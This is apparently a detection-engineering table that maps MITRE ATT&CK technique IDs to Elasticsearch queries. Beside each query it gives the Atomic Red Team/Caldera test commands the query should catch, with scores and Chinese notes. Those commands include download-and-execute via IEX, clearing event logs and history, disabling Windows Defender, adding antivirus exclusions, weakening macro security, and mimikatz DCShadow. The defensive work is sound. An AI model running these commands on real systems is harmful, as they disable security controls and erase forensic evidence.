T1497.003,"{
T1218.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-BuildAndInvokeInstallUtilAssembly""}},
                {""match_phrase"": {""CommandLine"": ""eaecbe_InstallUtilTestHarness.ps1""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","#caldera里该技术的8个能力都差不多，全是围绕这个脚本展开，现在没有进行深入了解
if (Test-Path ""eaecbe_InstallUtilTestHarness.ps1"") { ;
 } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; 
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""eaecbe_InstallUtilTestHarness.ps1""};  ; . eaecbe_InstallUtilTestHarness.ps1; 
$InstallerAssemblyDir = ""$Env:TEMP\""; 
$InstallerAssemblyFileName = ""T1218.004.dll""; 
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $ExpectedOutput = 'Constructor_'; 
$TestArgs = @{;
     OutputAssemblyDirectory = $InstallerAssemblyDir;
     OutputAssemblyFileName = $InstallerAssemblyFileName;
     InvocationMethod = 'CheckIfInstallable';
 }; 
$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; 
if ($ActualOutput -ne $ExpectedOutput) {;
     throw @"";
 CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.; 
Expected: $ExpectedOutput; Actual: $ActualOutput;
 ""@; }

if (Test-Path ""eaecbe_InstallUtilTestHarness.ps1"") { ;
 } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; 
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""eaecbe_InstallUtilTestHarness.ps1""};  ; 
. eaecbe_InstallUtilTestHarness.ps1; 
$InstallerAssemblyDir = ""$Env:TEMP\""; 
$InstallerAssemblyFileName = ""T1218.004.dll""; 
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; 
$CommandLine = ""/logfile= /logtoconsole=false `""$InstallerAssemblyFullPath`""""; 
$ExpectedOutput = 'Constructor_'; 
$TestArgs = @{;
     OutputAssemblyDirectory = $InstallerAssemblyDir;
     OutputAssemblyFileName = $InstallerAssemblyFileName;
     InvocationMethod = 'InstallHelper';
     CommandLine = $CommandLine; }; 
$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; 
if ($ActualOutput -ne $ExpectedOutput) {;
     throw @""; 
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput;
 ""@;
 }

if (Test-Path ""eaecbe_InstallUtilTestHarness.ps1"") { ;
 } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null;
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""eaecbe_InstallUtilTestHarness.ps1""};  ; 
. eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = ""$Env:TEMP\""; 
$InstallerAssemblyFileName = ""T1218.004.dll""; 
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; 
$CommandLine = ""/? `""$InstallerAssemblyFullPath`"""";
$ExpectedOutput = 'Constructor_HelpText_'; 
$TestArgs = @{;
     OutputAssemblyDirectory = $InstallerAssemblyDir;
     OutputAssemblyFileName = $InstallerAssemblyFileName;
     InvocationMethod = 'Executable';
     CommandLine = $CommandLine;
 }; 
$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs;
 if ($ActualOutput -ne $ExpectedOutput) {;
     throw @"";
 InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput;
 ""@;
 }",1
T1070.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Invoke-Maldoc -macroFile""}},
                    {""match"": {""CommandLine"": ""ClearLogs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""",2(4)
T1070.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [    
                {""wildcard"": {""CommandLine"": ""wevtutil*""}},
                {""match"": {""CommandLine"": ""cl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",wevtutil cl System,2
T1070.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [    
                {""match_phrase"": {""CommandLine"": ""Clear-Eventlog""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Clear-Eventlog Security;
Clear-Eventlog System;

$logs = Get-EventLog -List | ForEach-Object {$_.Log}; 
$logs | ForEach-Object {Clear-EventLog -LogName $_ }; 
Get-EventLog -list",4
T1070.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
                       
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                {""match"": {""CommandLine"": ""–HistorySaveStyle""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Set-PSReadlineOption -HistorySaveStyle SaveNothing,4
T1070.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Remove-Item""}},
                {""match_phrase"": {""CommandLine"": ""Get-PSReadlineOption""}},
                {""wildcard"": {""CommandLine"": ""*HistorySavePath""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Remove-Item (Get-PSReadlineOption).HistorySavePath,4
T1027.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""csc.exe""}},
                 {""match_phrase"": {""CommandLine"": ""Microsoft.NET\\Framework64""}},
                {""wildcard"": {""CommandLine"": ""out*""}},
                {""wildcard"": {""CommandLine"": ""*cs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\T1027.004.exe af2f1c_calc.cs,2
T1218.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-ATHCompiledHelp""}}
                       
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                {""wildcard"": {""CommandLine"": ""hh*""}},
                {""wildcard"": {""CommandLine"": ""*chm""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",hh.exe 879ef4_T1218.001.chm,2
T1218.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""control.exe""}},
                {""wildcard"": {""CommandLine"": ""*.cpl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",control.exe 187e67_calc.cpl,3
T1564,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""net user""}},
              
                {""match"": {""CommandLine"": ""/add""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",net user $ ATOMIC123! /add /active:yes,3(特殊字符)
T1564.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""attrib*""}},
                       {""wildcard"": {""CommandLine"": ""*txt""}},
                        
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""+h""}},
                        {""match"": {""CommandLine"": ""+s""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","attrib.exe +h %temp%\T1564.001.txt

attrib.exe +s %temp%\T1564.001.txt

mkdir %temp%\T1222.001_attrib_2 >nul 2>&1 
&& echo T1222.001_attrib1 >> %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt 
&& echo T1222.001_attrib2 >> %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt 
&& attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt 
&& attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt","2
(必须实现检测“+”，目前写法es会忽略特殊字符，导致此条会误查到本文档中63号对应的攻击命令)"
T1564.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""type ""}},
                {""match"": {""CommandLine"": "">""}},
                {""match"": {""CommandLine"": "":""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {;
     New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki;
     }; 
Start-Process -FilePath ""$env:comspec"" -ArgumentList ""/c,type,#{payload_path},>,`""#{ads_file_path}:#{ads_name}`""""",2
T1564.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""set-content""}},
                {""match_phrase"": {""CommandLine"": ""-stream""}},
                {""match_phrase"": {""CommandLine"": ""-value""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo ""test"" > $env:TEMP\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value ""test""; 
set-content -path $env:TEMP\T1564.004_has_ads_powershell.txt -stream adstest.txt -value ""test2""; 
set-content -path . -stream adstest.txt -value ""test3""",2
T1564.006,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Microsoft-Hyper""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""New-VM""}},
                        {""match_phrase"": {""CommandLine"": ""Set-VMFirmware""}},
                        {""match_phrase"": {""CommandLine"": ""Start-VM""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}
","if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V) { ;
 } else {Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force};  ;
 $VM = ""Atomic VM""; 
New-VM -Name $VM -Generation 2; 
Set-VMFirmware $VM -EnableSecureBoot Off; 
Start-VM $VM",2
T1564.006,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""VBoxManage*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""term"": {""CommandLine"": ""createvm""}},
                        {""term"": {""CommandLine"": ""modifyvm""}},
                        {""term"": {""CommandLine"": ""startvm""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}
","""C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" createvm --name ""Atomic VM"" --register 
&& ""C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" modifyvm ""Atomic VM"" --firmware efi 
&& ""C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"" startvm ""Atomic VM""",2
T1564.006,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""sc create""}},
                {""match"": {""CommandLine"": ""VboxDrv.sys""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","""C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe"" /reregserver 
&& regsvr32 /S ""C:\Program Files\Oracle\VirtualBox\VboxC.dll"" 
&& rundll32 ""C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init"" 
&& sc create VBoxDRV binpath= ""C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys"" type= kernel start= auto error= normal displayname= PortableVBoxDRV 
&& sc start VBoxDRV",2(5)
T1036.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""win32time*""}},
                        {""match"": {""CommandLine"":{ 
                                           ""query"": ""win32time"",
                                           ""fuzziness"": ""AUTO""}
                                       }
                       }
                    ]
     }
    },
    {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""win32time""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""sc create""}},
                        {""match_phrase"": {""CommandLine"": ""sc qc""}},
                        {""match_phrase"": {""CommandLine"": ""schtasks /create""}},
                        {""match_phrase"": {""CommandLine"": ""schtasks /query""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","sc create win32times binPath= ""cmd /c start c:\T1036.004_NonExistingScript.ps1"" 
&& sc qc win32times

schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1"" /tn win32times /f 
&& schtasks /query /tn win32times",2
T1207,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""lsadump::dcshadow""}},
                        {""wildcard"": {""CommandLine"": ""mimikatz*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Start-Process""}},
                        {""match_phrase"": {""CommandLine"": ""Wait-Process""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Content""}},
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$dc_output_file = ""$env:TEMP\art-T1207-mimikatz-DC.log""; 
Remove-Item $dc_output_file -ErrorAction Ignore; 
$mimikatzParam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`""""; 
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList ""/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam""; 
Start-Sleep -Seconds 5; &; 
Write-Host ""`nWaiting for fake DC server to return""; 
Wait-Process $dc; 
Write-Host ""`nOutput from fake DC server:""; 
Get-Content $dc_output_file; 
Start-Sleep 1; 
Remove-Item $dc_output_file -ErrorAction Ignore; 
Write-Host ""End of DCShadow""",(2)4
T1070.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""Win32_Process*""}},
                {""match_phrase"": {""CommandLine"": ""Get-CimClass""}},
                {""match_phrase"": {""CommandLine"": ""New-CimInstance""}},
                {""match_phrase"": {""CommandLine"": ""del /f""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;
$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;
$processClass = Get-CimClass -ClassName Win32_Process;
Invoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{
    Commandline = 'cmd.exe /c ""timeout /nobreak /t 10 >nul 2>nul & del /f #{location}""';
    ProcessStartupInformation = [CimInstance]$startupInfo
};",(2)4
T1070.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Remove-Item""}},
                {""match"": {""CommandLine"": ""prefetch""}},
                {""wildcard"": {""CommandLine"": ""*pf""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])",2(4)
T1070.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""history""}},
                        {""match"": {""CommandLine"": ""prefetch""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                       {""match_phrase"": {""CommandLine"": ""Remove-Item""}},
                       {""match_phrase"": {""CommandLine"": ""del /f""}},
                       {""match_phrase"": {""CommandLine"": ""rmdir /s""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item $env:TEMP\TeamViewer_54.log

Remove-Item -path $env:TEMP\deleteme_T1551.004

del /f %temp%\deleteme_T1551.004

Remove-Item -Path $env:TEMP\deleteme_folder_T1551.004 -Recurse

rmdir /s /q %temp%\deleteme_T1551.004

Remove-Item -Force -Path ""#{payload}""",2
T1070.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""reg add""}},
                {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\LanmanServer\\Parameters""}},
                {""wildcard"": {""CommandLine"": ""AutoShare*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareServer /t REG_DWORD /d 0 /f 
&& reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareWks /t REG_DWORD /d 0 /f",2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""net*""}},
                        {""wildcard"": {""CommandLine"": ""sc*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""McAfee*""}},
                        {""wildcard"": {""CommandLine"": ""360sd*""}},
                        {""wildcard"": {""CommandLine"": ""hipstray*""}},
                        {""wildcard"": {""CommandLine"": ""WinDefend*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""stop""}},
                        {""match_phrase"": {""CommandLine"": ""start=disabled""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net.exe stop McAfeeDLPAgentService 
&& sc.exe config McAfeeDLPAgentService start= disabled

sc stop WinDefend 
&& sc config WinDefend start=disabled 
&& sc query WinDefend",2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Add-MpPreference""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""-ExclusionPath""}},
                        {""match"": {""CommandLine"": ""-ExclusionProcess""}},
                        {""match"": {""CommandLine"": ""-ExclusionExtension""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$excludedExts= "".exe""; 
Add-MpPreference -ExclusionExtension  $excludedExts

$excludedpath= ""C:\Temp""; 
Add-MpPreference -ExclusionPath $excludedpath

$excludedProcess = ""outlook.exe""; 
Add-MpPreference -ExclusionProcess $excludedProcess",2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""AdvancedRun*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""sc*""}},
                        {""wildcard"": {""CommandLine"": ""powershell*""}}
      ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""stop WinDefend""}},
                        {""match_phrase"": {""CommandLine"": {
                                                              ""query"":""rmdir Windows Defender"",
                                                              ""slop"":4}}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Try {cmd /c $env:temp\AdvancedRun.exe /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}; 
if(0){;
   $CommandToRun = rmdir ""$env:programdata\Microsoft\Windows Defender"" -Recurse;
   Try {cmd /c $env:temp\AdvancedRun.exe /EXEFilename ""$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe"" /WindowState 0 /CommandLine ""$CommandToRun"" /StartDirectory """" /RunAs 8 /Run} Catch{};
 }",2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""DefenderControl*""}},
                {""match_phrase"": {""CommandLine"": ""/D FFFF""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",cmd /c $env:temp\DefenderControl\DefenderControl\DefenderControl.exe /D FFFF | Out-Null,2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Software\\Microsoft\\Office*""}},
                        {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""VBAWarnings*""}},
                        {""wildcard"": {""CommandLine"": ""DisableInternetFilesInPV*""}},
                        {""wildcard"": {""CommandLine"": ""DisableAttachementsInPV*""}},
                        {""wildcard"": {""CommandLine"": ""DisableUnsafeLocationsInPV*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel""; 
New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security""; 
New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView""; 
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security"" -Name ""VBAWarnings"" -Value ""1"" -PropertyType ""Dword""; 
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableInternetFilesInPV"" -Value ""1"" -PropertyType ""Dword""; 
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableUnsafeLocationsInPV"" -Value ""1"" -PropertyType ""Dword""; 
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableAttachementsInPV"" -Value ""1"" -PropertyType ""Dword""",(2)4
